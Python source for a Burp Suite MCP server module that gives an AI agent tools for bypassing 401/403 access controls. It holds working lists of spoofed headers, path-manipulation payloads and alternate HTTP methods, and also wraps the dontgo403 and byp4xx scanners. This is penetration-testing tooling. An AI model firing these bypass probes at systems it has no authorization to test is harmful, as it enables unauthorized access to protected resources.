"""WAF 40x-bypass tools.

In-process probe (`probe_40x_bypass`) — runs canonical header / path /
method tricks through Burp without external binaries. CLI wrappers
(`run_dontgo403`, `run_byp4xx`) shell out when those binaries are
present for broader coverage.
"""

from __future__ import annotations

import asyncio
import time
from typing import Any
from urllib.parse import urlparse, urlunparse

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client
from burpsuite_mcp.tools.recon._common import _check_tool, _run_cmd
from burpsuite_mcp.tools.testing._verdict import error_verdict, make_verdict


_HEADER_BYPASSES = [
    {"X-Original-URL": "{path}"},
    {"X-Rewrite-URL": "{path}"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Host": "localhost"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Forwarded-Server": "localhost"},
    {"X-HTTP-Method-Override": "GET"},
    {"X-Method-Override": "GET"},
    {"X-Original-Method": "GET"},
    {"Referer": "https://target.tld/admin"},
    {"X-Real-IP": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1;by=127.0.0.1;host=localhost"},
]

_PATH_BYPASSES = [
    "{path}/",
    "{path}/.",
    "{path}/./",
    "{path}//",
    "{path}/..;/",
    "{path};/",
    "{path}/%2e",
    "{path}%20",
    "{path}%09",
    "{path}.json",
    "{path}.html",
    "{path}#",
    "{path}?",
    "{path}/%2f",
    "/.{path}",
    "/{path}/.",
    "//{path}",
]

_METHOD_BYPASSES = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE", "CONNECT"]


def _split_url(url: str) -> tuple[str, str, str]:
    """Return (origin, path, query). 'origin' is scheme://netloc."""
    u = urlparse(url)
    origin = f"{u.scheme}://{u.netloc}"
    path = u.path or "/"
    query = u.query
    return origin, path, query


def _build_url(origin: str, path: str, query: str) -> str:
    pu = urlparse(origin)
    return urlunparse((pu.scheme, pu.netloc, path, "", query, ""))


def register(mcp: FastMCP) -> None:

    @mcp.tool()
    async def probe_40x_bypass(
        url: str,
        method: str = "GET",
        baseline_status: int = 0,
        max_variants: int = 60,
        concurrency: int = 8,
    ) -> dict:
        """Try canonical 40x bypass tricks (header / path / method) against a URL.

        Returns VerdictResult (W7 schema).

        Args:
            url: target URL returning 401/403 you want to bypass.
            method: original method (defaults to GET).
            baseline_status: skip baseline GET if you already know it (e.g. 403).
            max_variants: variant cap.
            concurrency: in-flight count.
        """
        method = method.upper()
        origin, path, query = _split_url(url)

        if not baseline_status:
            baseline = await client.post("/api/http/curl", json={
                "url": url, "method": method, "follow_redirects": False,
            })
            if "error" in baseline:
                return error_verdict(
                    f"baseline failed: {baseline['error']}",
                    vuln_type="auth_bypass",
                )
            baseline_status = baseline.get("status_code", 0)
        baseline_url = url

        variants: list[dict[str, Any]] = []
        for h in _HEADER_BYPASSES:
            hdrs = [{"name": k, "value": v.replace("{path}", path)} for k, v in h.items()]
            variants.append({"kind": "header", "label": next(iter(h)),
                             "url": baseline_url, "method": method, "headers": hdrs})
        for pat in _PATH_BYPASSES:
            new_path = pat.replace("{path}", path)
            variants.append({"kind": "path", "label": pat,
                             "url": _build_url(origin, new_path, query), "method": method, "headers": []})
        for m in _METHOD_BYPASSES:
            if m == method:
                continue
            variants.append({"kind": "method", "label": m,
                             "url": baseline_url, "method": m, "headers": []})
        variants = variants[:max_variants]

        sem = asyncio.Semaphore(max(1, concurrency))
        results: list[dict[str, Any]] = [{} for _ in variants]

        async def _one(i: int, v: dict[str, Any]) -> None:
            async with sem:
                start = time.perf_counter()
                req = {"url": v["url"], "method": v["method"], "follow_redirects": False}
                if v["headers"]:
                    req["headers"] = v["headers"]
                try:
                    resp = await client.post("/api/http/curl", json=req)
                except Exception as e:
                    results[i] = {"err": str(e)[:120], "label": v["label"]}
                    return
                elapsed = int((time.perf_counter() - start) * 1000)
                results[i] = {
                    "kind": v["kind"],
                    "label": v["label"],
                    "status": resp.get("status_code", 0),
                    "length": len(resp.get("response_body") or ""),
                    "elapsed_ms": elapsed,
                    "history_index": resp.get("history_index"),
                }

        await asyncio.gather(*[_one(i, v) for i, v in enumerate(variants)])

        hits = [r for r in results
                if r.get("status") and r["status"] != baseline_status
                and 200 <= r["status"] < 400]

        lines = [
            f"# probe_40x_bypass — {url}",
            f"Baseline: {method} -> {baseline_status}",
            f"Variants tested: {len(variants)} (header={sum(1 for v in variants if v['kind']=='header')}, "
            f"path={sum(1 for v in variants if v['kind']=='path')}, "
            f"method={sum(1 for v in variants if v['kind']=='method')})",
            "",
            f"Bypass hits (status -> 2xx/3xx): {len(hits)}",
        ]
        for r in hits[:25]:
            lines.append(
                f"  [{r['kind']:<6}] status {baseline_status}->{r['status']}  "
                f"len={r['length']}  history_index={r.get('history_index')}  variant={r['label']!r}"
            )
        if hits:
            lines.append("")
            lines.append("Next: send_to_repeater_tracked(history_index) for the strongest hit.")
        human = "\n".join(lines)
        logger_indices = [
            int(r["history_index"]) for r in hits
            if isinstance(r.get("history_index"), int) and r["history_index"] >= 0
        ][:10]
        if len(hits) >= 2:
            verdict, confidence = "CONFIRMED", 0.85
            ev = f"40x bypass via {len(hits)} variant(s): {baseline_status}->2xx/3xx"
        elif len(hits) == 1:
            verdict, confidence = "SUSPECTED", 0.6
            ev = f"single 40x bypass variant: {hits[0]['label']!r}"
        else:
            verdict, confidence = "FAILED", 0.1
            ev = "no 40x bypass — header/path/method tricks all rejected"

        return make_verdict(
            verdict, confidence, ev,
            vuln_type="auth_bypass",
            logger_indices=logger_indices,
            details={
                "url": url, "baseline_status": baseline_status,
                "variants_tested": len(variants),
                "hits": [{"label": r["label"], "kind": r["kind"], "status": r["status"]} for r in hits[:10]],
            },
            summary=human,
        )

    @mcp.tool()
    async def run_dontgo403(url: str, timeout: int = 300) -> str:
        """Wrap dontgo403 — community 40x-bypass scanner.

        Args:
            url: target URL.
            timeout: seconds.
        """
        if not _check_tool("dontgo403"):
            return (
                "Error: dontgo403 not installed.\n"
                "Install: go install github.com/devploit/dontgo403@latest"
            )
        out, err, rc = await _run_cmd(
            ["dontgo403", "-u", url, "-x", "http://127.0.0.1:8080"],
            timeout=timeout, bypass_proxy=False,
        )
        if rc != 0 and not out:
            return f"dontgo403 failed [rc={rc}]: {err[:300]}"
        return f"# dontgo403 — {url}\n\n{out.strip()[:5000]}"

    @mcp.tool()
    async def run_byp4xx(url: str, timeout: int = 300) -> str:
        """Wrap byp4xx — alternate 40x-bypass scanner.

        Args:
            url: target URL.
            timeout: seconds.
        """
        if not _check_tool("byp4xx"):
            return (
                "Error: byp4xx not installed.\n"
                "Install: go install -v github.com/lobuhi/byp4xx@latest"
            )
        out, err, rc = await _run_cmd(
            ["byp4xx", url], timeout=timeout, bypass_proxy=False,
        )
        if rc != 0 and not out:
            return f"byp4xx failed [rc={rc}]: {err[:300]}"
        return f"# byp4xx — {url}\n\n{out.strip()[:5000]}"
